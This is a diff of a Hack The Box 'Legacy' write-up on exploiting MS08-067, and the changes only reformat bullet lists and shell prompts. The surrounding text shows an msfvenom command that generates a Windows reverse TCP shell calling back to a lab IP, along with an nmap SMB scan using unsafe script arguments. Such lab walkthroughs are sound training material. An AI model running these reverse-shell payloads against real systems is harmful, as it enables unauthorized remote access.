@@ -93,11 +93,11 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.142 LPORT=4443 EXITFUNC=thr
 ```
 
 Thankfully the POC is well documentated for what it wants for shellcode, but to break this down a bit:
-    - Windows Reverse TCP shell payload
-    - Call back to me on port 4443 (I try to pick ports over 1000 whenever possible)
-    - If the shell exits, keep the program running (hence the thread)
-    - Give it to me in Python format (saves you time reformatting)
-    - x86 architecture
+- Windows Reverse TCP shell payload
+- Call back to me on port 4443 (I try to pick ports over 1000 whenever possible)
+- If the shell exits, keep the program running (hence the thread)
+- Give it to me in Python format (saves you time reformatting)
+- x86 architecture
 
 ![Shellcode Generation](/assets/img/htb/legacy/legacy_shellcode_gen.png)
 
@@ -108,8 +108,7 @@ I did screw up and forget to pass the ```-v``` flag, allowing me to rename the b
 After inserting the new shellcode, I *really* didn't feel like dealing with python2 dependencies, so I converted the python2 syntax of the POC to python3 with [2to3](https://docs.python.org/3/library/2to3.html).
 
 ```bash
-┌──(nullprism㉿granite)-[~/htb/legacy/10.129.192.174/exploit]
-└─$ 2to3 -w MS08-067.py
+2to3 -w MS08-067.py
 ```
 
 ### Finalizing the Code
@@ -136,8 +135,7 @@ nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-d
 Based on the output, I'm pretty sure that script by nmap was run in our catch all earlier, but I'll double check.
 
 ```bash
-┌──(nullprism㉿granite)-[~/htb/legacy/10.129.192.174/exploit]
-└─$ nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery 10.129.192.174 -Pn
+nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery 10.129.192.174 -Pn
 ```
 ```
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
